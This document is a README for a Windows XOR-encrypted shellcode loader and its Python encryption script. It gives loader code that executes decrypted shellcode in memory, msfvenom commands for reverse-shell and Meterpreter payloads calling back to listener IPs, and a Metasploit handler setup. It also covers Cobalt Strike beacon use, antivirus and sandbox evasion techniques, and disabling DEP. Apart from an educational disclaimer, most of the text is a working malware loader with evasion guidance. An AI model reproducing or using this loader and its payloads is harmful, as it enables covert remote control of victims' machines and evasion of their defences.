# 🔐 XOR Shellcode Loader

<div align="center">

![C++](https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

**A simple yet effective XOR-encrypted shellcode loader for Windows with Python encryption utility**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [How It Works](#-how-it-works) • [Security](#-security) • [FAQ](#-faq)

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Detailed Usage](#-detailed-usage)
  - [Encrypting Payloads](#1-encrypting-payloads)
  - [Loading Payloads](#2-loading-payloads)
  - [Customization](#3-customization)
- [How It Works](#-how-it-works)
- [Security Considerations](#-security-considerations)
- [Evasion Techniques](#-evasion-techniques)
- [Advanced Usage](#-advanced-usage)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [Legal Disclaimer](#️-legal-disclaimer)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 Overview

This project implements a basic **XOR-encrypted shellcode loader** for Windows systems. It consists of two components:

1. **Python Encryption Tool** (`xorencrypt.py`) - Encrypts raw shellcode using XOR cipher
2. **C++ Loader** (`code.cpp`) - Decrypts and executes the encrypted payload in memory

The loader demonstrates fundamental techniques used in malware development and red team operations, including:
- Memory allocation and manipulation
- XOR encryption/decryption
- In-memory code execution
- Thread-based payload execution

> ⚠️ **Educational Purpose Only**: This tool is designed for security research, penetration testing, and educational purposes. See [Legal Disclaimer](#️-legal-disclaimer).

---

## ✨ Features

### 🔑 Core Capabilities

- **XOR Encryption**: Simple yet effective obfuscation technique
- **In-Memory Execution**: Payload runs entirely in memory without touching disk
- **Thread-Based Execution**: Runs shellcode in a separate thread
- **Cross-Architecture Support**: Works with any raw shellcode (x86/x64)
- **Memory Protection**: Proper RW → RX memory protection handling
- **File-Based Loading**: Reads encrypted payload from external file
- **Minimal Dependencies**: Uses only Windows API and standard libraries

### 🛡️ Evasion Features

- **Static Analysis Evasion**: Payload is encrypted on disk
- **Simple Obfuscation**: XOR cipher prevents basic signature detection
- **Modular Design**: Easy to extend with additional evasion techniques
- **Clean Error Handling**: Professional error management

---

## 🏗️ Architecture

### Workflow Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    Payload Preparation                       │
│                                                              │
│  [Raw Shellcode]  ──────────────────────────────────────┐  │
│   (shellcode.bin)                                        │  │
│                                                          │  │
│                          ▼                               │  │
│                  ┌───────────────┐                       │  │
│                  │ xorencrypt.py │                       │  │
│                  │               │                       │  │
│                  │ XOR Cipher    │                       │  │
│                  │ Key: "key"    │                       │  │
│                  └───────────────┘                       │  │
│                          │                               │  │
│                          ▼                               │  │
│              [Encrypted Payload]                         │  │
│               (user.dat)                                 │  │
└──────────────────────────────────────────────────────────┘  │
                           │                                  │
                           ▼                                  │
┌─────────────────────────────────────────────────────────────┐
│                   Runtime Execution                         │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │              C++ Loader (code.cpp)                   │  │
│  │                                                      │  │
│  │  1. Open File ──────► user.dat                      │  │
│  │                                                      │  │
│  │  2. Allocate Memory ─► VirtualAlloc (RW)            │  │
│  │                                                      │  │
│  │  3. Read File ──────► Load into memory              │  │
│  │                                                      │  │
│  │  4. Decrypt ────────► XOR with "key"                │  │
│  │                                                      │  │
│  │  5. Set Protection ─► VirtualProtect (RX)           │  │
│  │                                                      │  │
│  │  6. Create Thread ──► Execute shellcode             │  │
│  │                                                      │  │
│  │  7. Wait ───────────► WaitForSingleObject           │  │
│  └──────────────────────────────────────────────────────┘  │
│                          │                                  │
│                          ▼                                  │
│                  [Shellcode Execution]                      │
│                  (In-Memory Thread)                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 Installation

### Prerequisites

**For Python Script:**
- Python 3.6 or higher
- No external dependencies

**For C++ Loader:**
- Windows OS (Windows 7+, Windows Server 2008+)
- Visual Studio 2017+ or MinGW-w64
- Windows SDK

### Building the Loader

#### Using Visual Studio

```bash
# Clone the repository
git clone https://github.com/yourusername/xor-shellcode-loader.git
cd xor-shellcode-loader

# Open Visual Studio Developer Command Prompt
cl.exe code.cpp /EHsc /Fe:loader.exe

# Or use CMake
mkdir build && cd build
cmake ..
cmake --build .
```

#### Using MinGW-w64

```bash
# Compile with g++
g++ code.cpp -o loader.exe -static-libgcc -static-libstdc++

# With optimization
g++ code.cpp -o loader.exe -O2 -s -static
```

#### CMakeLists.txt Example

```cmake
cmake_minimum_required(VERSION 3.10)
project(XORShellcodeLoader)

set(CMAKE_CXX_STANDARD 17)
add_executable(loader code.cpp)
```

---

## 🎯 Quick Start

### Step 1: Generate Shellcode

Generate your shellcode using msfvenom or any other tool:

```bash
# Example: Windows reverse shell (x64)
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f raw -o shellcode.bin

# Example: Calculator popup (x64)
msfvenom -p windows/x64/exec CMD=calc.exe \
         -f raw -o shellcode.bin
```

### Step 2: Encrypt the Payload

```bash
# Encrypt the shellcode
python xorencrypt.py shellcode.bin

# Output: shellcode_encrypted.bin
```

### Step 3: Rename and Deploy

```bash
# Rename the encrypted file to user.dat
mv shellcode_encrypted.bin user.dat

# Place in the same directory as loader.exe
```

### Step 4: Execute

```bash
# Run the loader
loader.exe
```

---

## 📚 Detailed Usage

### 1. Encrypting Payloads

#### Basic Encryption

```bash
python xorencrypt.py <input_file>
```

**Example:**
```bash
python xorencrypt.py shellcode.bin
# Output: shellcode_encrypted.bin
```

#### Custom Output Name

Modify the script to specify output filename:

```python
# In xorencrypt.py, change:
output_filename = "user.dat"  # Instead of auto-generated name
```

#### Verifying Encryption

```python
# Check file sizes match
import os
print(f"Original: {os.path.getsize('shellcode.bin')} bytes")
print(f"Encrypted: {os.path.getsize('shellcode_encrypted.bin')} bytes")
```

---

### 2. Loading Payloads

#### File Requirements

The loader expects:
- **Filename**: `user.dat` (hardcoded)
- **Location**: Same directory as `loader.exe`
- **Format**: Raw XOR-encrypted binary

#### Execution Flow

```cpp
1. Open user.dat
2. Allocate RW memory
3. Read encrypted data
4. XOR decrypt in-place
5. Change to RX memory
6. Create thread at memory address
7. Wait for completion
```

#### Error Handling

The loader provides clear error messages:

| Error | Meaning | Solution |
|-------|---------|----------|
| `Failed to open user.dat` | File not found | Ensure user.dat exists |
| `Could not get file size` | File access issue | Check file permissions |
| `Memory allocation failed` | Insufficient memory | Close other applications |
| `Failed to read file` | I/O error | Verify file integrity |
| `Failed to change memory protection` | DEP conflict | Check DEP settings |
| `Failed to create execution thread` | Thread creation error | Check system resources |

---

### 3. Customization

#### Changing the XOR Key

**In Python (`xorencrypt.py`):**
```python
# Line 38 - Change the key
key = b"YourCustomKey123"
```

**In C++ (`code.cpp`):**
```cpp
// Line 28 - Must match Python key
const char xorKey[] = "YourCustomKey123";
```

⚠️ **Important**: Both keys must be identical!

#### Changing the Payload Filename

**In C++ (`code.cpp`):**
```cpp
// Line 31 - Change filename
fileHandle = CreateFileA(
    "custom_payload.dat",  // Change here
    GENERIC_READ,
    // ...
);
```

#### Adding Multiple XOR Rounds

Enhance encryption by applying XOR multiple times:

**In Python:**
```python
# Encrypt multiple times
ciphertext = plaintext
for _ in range(3):  # 3 rounds
    ciphertext = xor_encrypt(ciphertext, key)
```

**In C++:**
```cpp
// Decrypt multiple times
for (int i = 0; i < 3; i++) {
    XorBuffer(
        reinterpret_cast<char*>(allocatedMemory),
        fileSize.LowPart,
        xorKey,
        sizeof(xorKey)
    );
}
```

---

## 🔬 How It Works

### Python Encryption Tool

#### XOR Encryption Algorithm

```python
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    encrypted = bytearray()
    key_length = len(key)
    
    for index, byte in enumerate(data):
        # XOR each byte with corresponding key byte
        key_byte = key[index % key_length]
        encrypted.append(byte ^ key_byte)
    
    return bytes(encrypted)
```

**How XOR Works:**
- Each byte of data is XORed with a byte from the key
- Key repeats if data is longer than key
- XOR is symmetric: encrypt and decrypt are the same operation

**Example:**
```
Data:    [0x41, 0x42, 0x43]  ("ABC")
Key:     [0x6B, 0x65, 0x79]  ("key")
Result:  [0x2A, 0x27, 0x3A]  (encrypted)

Reversing:
Encrypted: [0x2A, 0x27, 0x3A]
Key:       [0x6B, 0x65, 0x79]  ("key")
Result:    [0x41, 0x42, 0x43]  ("ABC") ✓
```

---

### C++ Loader

#### Step-by-Step Breakdown

**1. File Opening**
```cpp
fileHandle = CreateFileA(
    "user.dat",              // File to open
    GENERIC_READ,            // Read access
    FILE_SHARE_READ,         // Allow sharing
    nullptr,                 // Default security
    OPEN_EXISTING,           // Must exist
    FILE_ATTRIBUTE_NORMAL,   // Normal file
    nullptr                  // No template
);
```

**2. Memory Allocation**
```cpp
allocatedMemory = VirtualAlloc(
    nullptr,                      // Let OS choose address
    fileSize.LowPart,            // Size in bytes
    MEM_COMMIT | MEM_RESERVE,    // Reserve and commit
    PAGE_READWRITE               // RW permissions
);
```

**Why RW first?**
- Need to write decrypted data
- Will change to RX before execution

**3. File Reading**
```cpp
ReadFile(
    fileHandle,           // File handle
    allocatedMemory,      // Destination buffer
    fileSize.LowPart,     // Bytes to read
    &bytesRead,           // Bytes actually read
    nullptr               // No overlap
);
```

**4. XOR Decryption**
```cpp
void XorBuffer(char* buffer, size_t bufferSize, 
               const char* key, size_t keySize) {
    size_t keyIndex = 0;
    
    for (size_t i = 0; i < bufferSize; i++) {
        buffer[i] ^= key[keyIndex];
        keyIndex++;
        
        // Wrap around when key ends
        if (keyIndex >= keySize - 1) {
            keyIndex = 0;
        }
    }
}
```

**5. Memory Protection Change**
```cpp
VirtualProtect(
    allocatedMemory,      // Memory region
    fileSize.LowPart,     // Size
    PAGE_EXECUTE_READ,    // New protection (RX)
    &oldProtection        // Store old protection
);
```

**Why change to RX?**
- Security: Modern systems prevent execution from RW memory
- DEP (Data Execution Prevention) enforcement
- Required for legitimate execution

**6. Thread Creation**
```cpp
threadHandle = CreateThread(
    nullptr,              // Default security
    0,                    // Default stack size
    (LPTHREAD_START_ROUTINE)allocatedMemory,  // Entry point
    nullptr,              // No parameters
    0,                    // Start immediately
    nullptr               // Don't store thread ID
);
```

**Why use a thread?**
- Allows main program to continue
- Clean separation of execution
- Can wait for completion with WaitForSingleObject

**7. Synchronization**
```cpp
WaitForSingleObject(threadHandle, INFINITE);
```

Waits indefinitely for the shellcode thread to complete.

---

## 🛡️ Security Considerations

### Current Security Level

This implementation provides **BASIC** evasion against:
- ✅ Static file analysis (payload is encrypted)
- ✅ Simple signature-based detection
- ✅ Basic string searches

It does **NOT** evade:
- ❌ Behavior-based detection
- ❌ Memory scanners
- ❌ Advanced EDR/AV solutions
- ❌ Sandbox analysis
- ❌ YARA rules for API patterns

### Limitations

#### 1. **Weak Encryption**
- XOR is easily breakable with known-plaintext attacks
- Simple key makes brute-force trivial
- No key derivation function (KDF)

#### 2. **Obvious API Calls**
- VirtualAlloc, VirtualProtect, CreateThread are heavily monitored
- Sequence of calls is a well-known pattern
- No API obfuscation

#### 3. **Static Strings**
- Filename "user.dat" is hardcoded
- XOR key is in plaintext
- Error messages reveal functionality

#### 4. **Memory Artifacts**
- Shellcode resides in RX memory
- No memory cleaning after execution
- Thread creation is logged by ETW

---

## 🥷 Evasion Techniques

### Basic Improvements

#### 1. **API Obfuscation**
```cpp
// Use GetProcAddress to load APIs dynamically
typedef LPVOID (WINAPI* VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);

HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
VirtualAllocFunc pVirtualAlloc = (VirtualAllocFunc)GetProcAddress(
    kernel32, "VirtualAlloc"
);
```

#### 2. **Sleep Evasion**
```cpp
// Add delays to evade sandbox timeouts
Sleep(10000);  // Sleep 10 seconds before execution
```

#### 3. **String Encryption**
```cpp
// Encrypt strings at compile time
const char encryptedFilename[] = {0x74, 0x73, 0x64, 0x71}; // "user"
```

#### 4. **Memory Fluctuation**
```cpp
// Change memory protection before/after use
VirtualProtect(allocatedMemory, size, PAGE_NOACCESS, &old);
Sleep(1000);
VirtualProtect(allocatedMemory, size, PAGE_EXECUTE_READ, &old);
```

### Advanced Techniques

#### 1. **Process Hollowing**
Replace legitimate process memory instead of direct execution

#### 2. **APC Injection**
Use Asynchronous Procedure Calls instead of CreateThread

#### 3. **Module Stomping**
Overwrite legitimate loaded module memory

#### 4. **Syscalls**
Direct system calls instead of Windows APIs

#### 5. **Heaven's Gate**
WoW64 transition for x64 syscalls from x86 process

---

## 🔧 Advanced Usage

### Using with Metasploit

#### Generate Payload
```bash
# Generate staged payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.0.0.1 LPORT=443 \
         -f raw -o payload.bin

# Encrypt
python xorencrypt.py payload.bin
mv payload_encrypted.bin user.dat
```

#### Setup Listener
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 443
exploit
```

### Cobalt Strike Integration

```bash
# Generate raw beacon
# In Cobalt Strike: Attacks → Packages → Windows Executable (S)
# Format: Raw

# Encrypt the beacon
python xorencrypt.py beacon.bin
mv beacon_encrypted.bin user.dat
```

### Custom Shellcode

#### Writing Custom Shellcode
```nasm
; Example: MessageBox in x64 assembly
section .text
global _start

_start:
    ; MessageBoxA(NULL, "Hello", "Title", MB_OK)
    xor rcx, rcx          ; hWnd = NULL
    lea rdx, [rel msg]    ; lpText
    lea r8, [rel title]   ; lpCaption
    xor r9, r9            ; uType = MB_OK
    
    mov rax, 0x7FFF0000   ; MessageBoxA address (example)
    call rax
    
    ret

msg:    db "Hello, World!", 0
title:  db "Shellcode", 0
```

Compile and extract:
```bash
nasm -f win64 shellcode.asm -o shellcode.o
objcopy -O binary shellcode.o shellcode.bin
python xorencrypt.py shellcode.bin
```

---

## 🔧 Troubleshooting

### Common Issues

#### 1. "Failed to open user.dat"

**Cause:** File not found or inaccessible

**Solutions:**
```bash
# Check file exists
dir user.dat

# Check file permissions
icacls user.dat

# Ensure correct directory
cd /d C:\path\to\loader
```

#### 2. "Failed to change memory protection"

**Cause:** DEP (Data Execution Prevention) enabled

**Solutions:**
```bash
# Disable DEP for specific app (Admin cmd)
bcdedit /set nx AlwaysOff

# Or use VirtualAllocEx with EXECUTE flags from start
```

#### 3. Program Crashes Immediately

**Cause:** Incorrect XOR key or corrupted shellcode

**Solutions:**
- Verify both Python and C++ use same key
- Re-generate and re-encrypt payload
- Test with simple shellcode (calc.exe)

#### 4. Antivirus Detection

**Cause:** Known API pattern or signature

**Solutions:**
- Use custom packer/crypter
- Implement API obfuscation
- Add junk code for entropy
- Use different execution method (APC, etc.)

#### 5. Shellcode Doesn't Execute

**Cause:** Incompatible architecture (x86 vs x64)

**Solutions:**
```bash
# Match loader architecture to shellcode
# For x64 shellcode:
cl.exe code.cpp /Fe:loader_x64.exe

# For x86 shellcode:
cl.exe code.cpp /Fe:loader_x86.exe /MACHINE:X86
```

---

## ❓ FAQ

### General Questions

**Q: Is XOR encryption secure?**
A: No. XOR is trivially breakable but sufficient for basic AV evasion. For production, use AES-256.

**Q: Why not use stronger encryption?**
A: Educational purpose. XOR demonstrates the concept simply. Real malware uses AES, ChaCha20, or custom algorithms.

**Q: Can this evade modern EDR?**
A: No. Modern EDR systems detect behavioral patterns, API calls, and memory anomalies. This is a teaching tool.

**Q: Is this detected by Windows Defender?**
A: Likely yes. The API call pattern is well-known. Use additional evasion techniques.

### Technical Questions

**Q: Why VirtualAlloc instead of HeapAlloc?**
A: VirtualAlloc allows specifying memory protection (RWX). HeapAlloc doesn't support execution.

**Q: Why change from RW to RX?**
A: Modern systems enforce DEP/NX. Memory must be RX (not RWX) for legitimate execution.

**Q: Can I use multiple payloads?**
A: Yes, modify the code to load multiple files and execute them in sequence or parallel.

**Q: Why use CreateThread instead of direct call?**
A: Threads provide clean separation. Direct call would transfer control completely.

**Q: What's the maximum payload size?**
A: Limited by available memory. Typical limits: 2GB on x86, 128TB on x64.

### Operational Questions

**Q: Can this run without admin rights?**
A: Yes, if UAC allows. VirtualAlloc doesn't require admin in user space.

**Q: Does it leave traces?**
A: Yes. Process memory, ETW events, file access logs, and thread creation are all logged.

**Q: Can it be run from USB?**
A: Yes, if AutoRun is enabled or user manually executes it.

**Q: How to make it persistent?**
A: Add registry keys, scheduled tasks, or service installation. Not covered here.

---

## ⚖️ Legal Disclaimer

### ⚠️ IMPORTANT NOTICE

This software is provided for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.

### ✅ Authorized Use

- Security research in controlled environments
- Penetration testing with written authorization
- Academic study of malware techniques
- Red team operations with proper scope
- Personal learning and experimentation

### ❌ Prohibited Use

- Unauthorized access to computer systems
- Malicious software distribution
- Cybercrime or illegal activities
- Attacks on systems without permission
- Any violation of local, national, or international law

### 📜 Legal Responsibility

**Users of this software agree to:**

1. Obtain explicit written authorization before testing any system
2. Comply with all applicable laws and regulations
3. Use this tool ethically and responsibly
4. Accept full legal responsibility for their actions

**The authors and contributors:**

1. Assume NO liability for misuse of this software
2. Do NOT condone illegal activities
3. Provide this tool "AS IS" without warranties
4. Are NOT responsible for any damages caused

### 🚨 Legal Consequences

Unauthorized use may result in:
- Criminal prosecution under CFAA (USA), CMA (UK), or local laws
- Civil lawsuits and financial penalties
- Imprisonment
- Loss of professional credentials

**When in doubt, consult a lawyer before use.**

---

## 🤝 Contributing

Contributions are welcome! Here's how to help:

### Reporting Bugs

1. Check if issue already exists
2. Provide detailed information:
   - OS version
   - Compiler version
   - Error messages
   - Steps to reproduce

### Suggesting Features

Ideas for improvements:
- Additional encryption algorithms (AES, RC4)
- Process injection techniques
- API obfuscation methods
- AMSI bypass integration
- ETW patching
- Reflective DLL loading

### Code Contributions

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

### Coding Standards

- Use clear variable names
- Add comments for complex logic
- Follow existing code style
- Test on multiple Windows versions
- Document new features

---

## 📄 License

```
MIT License

Copyright (c) 2025 [Your Name]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🔗 Related Resources

### Learning Materials
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Shellcode Injection Techniques](https://www.ired.team/)
- [Malware Development](https://0xpat.github.io/)
- [Red Team Notes](https://www.ired.team/offensive-security/)

### Tools
- [Metasploit Framework](https://www.metasploit.com/)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [msfvenom Cheat Sheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
- [PE-bear](https://github.com/hasherezade/pe-bear-releases) - PE analysis

### Detection & Defense
- [Yara Rules](https://github.com/Yara-Rules/rules)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [Windows Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)

---

## 📞 Contact

- **GitHub Issues:** [Report bugs or request features](https://github.com/yourusername/xor-shellcode-loader/issues)
- **Discussions:** [Ask questions](https://github.com/yourusername/xor-shellcode-loader/discussions)
- **Email:** your.email@example.com

---

## 🙏 Acknowledgments

- Windows API documentation by Microsoft
- Security research community
- Offensive security educators
- Open-source malware analysis tools

---

<div align="center">

**⚠️ USE RESPONSIBLY AND LEGALLY ⚠️**

Made with 🔴 for Security Research

[⬆ Back to Top](#-xor-shellcode-loader)

</div>


![bypassav](https://github.com/user-attachments/assets/5ddb30a3-1989-412d-8887-0d55dd3d50a1)
